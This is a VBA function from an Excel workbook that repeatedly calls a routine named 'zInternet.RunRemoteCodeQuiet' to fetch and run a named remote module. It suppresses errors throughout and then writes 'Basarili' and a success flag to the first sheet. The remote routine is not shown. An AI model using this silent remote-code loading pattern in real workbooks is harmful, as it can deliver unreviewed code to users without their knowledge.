Public Function DynamicFunc(targetWb As Workbook, param As Variant) As Object
    Dim parts() As String : parts = Split(CStr(param), "|", 2)
    Dim modName As String : modName = Trim$(parts(0))
    Dim tries As Long : tries = IIf(UBound(parts) >= 1, CLng(Val(parts(1))), 3)
    Dim i As Long, ok As Boolean : ok = False
    For i = 1 To tries
        On Error Resume Next
        Application.Run "zInternet.RunRemoteCodeQuiet", modName
        If Err.Number = 0 Then ok = True : Exit For
        Err.Clear
        Application.Wait Now + TimeValue("00:00:02")
    Next i
    Dim ws As Worksheet : Set ws = targetWb.Sheets(1) : ws.Range("A1").Value = "Basarili" : ws.Range("B1").Value = ok
    Set DynamicFunc = Nothing
End Function
